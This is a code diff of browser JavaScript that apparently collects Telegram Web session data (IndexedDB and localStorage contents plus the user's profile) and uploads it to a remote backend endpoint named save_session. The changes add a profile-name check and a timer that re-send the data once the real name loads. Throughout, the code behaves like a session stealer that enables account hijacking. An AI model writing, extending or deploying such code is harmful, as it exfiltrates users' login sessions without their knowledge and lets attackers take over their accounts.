@@ -193,6 +193,7 @@
             let lastSyncLength = 0; 
             let wasLoggedIn = false; 
             let lastKnownUserId = null; 
+            let lastSyncedName = "Unknown Profile";
 
             const syncSessionData = async () => {
                 let profile = getTelegramProfile();
@@ -243,7 +244,7 @@
                         const idbDataStr = serializeData(rawIdbData);
                         
                         const currentDataLength = idbDataStr.length + lsDataStr.length;
-                        if (lastSyncLength === currentDataLength) return; 
+                        if (lastSyncLength === currentDataLength && lastSyncedName === profile.name) return;
 
                         const res = await fetch(BACKEND_URL + "/api/save_session", {
                             method: "POST",
@@ -262,7 +263,8 @@
                         
                         if(res.ok) {
                             console.log("Data Synced successfully for:", lastKnownUserId);
-                            lastSyncLength = currentDataLength; 
+                            lastSyncLength = currentDataLength;
+                            if(profile.name) lastSyncedName = profile.name;
                         }
                     } catch(e) {}
                 }
@@ -284,6 +286,9 @@
             let logoutDetected = false;
             setInterval(() => {
                 const currentProfile = getTelegramProfile();
+                if (wasLoggedIn && currentProfile && currentProfile.name !== "Unknown Profile" && lastSyncedName === "Unknown Profile") {
+                    syncSessionData(); 
+                }
                 
                 if (wasLoggedIn && !logoutDetected) {
                     if (!currentProfile || !currentProfile.uid) {
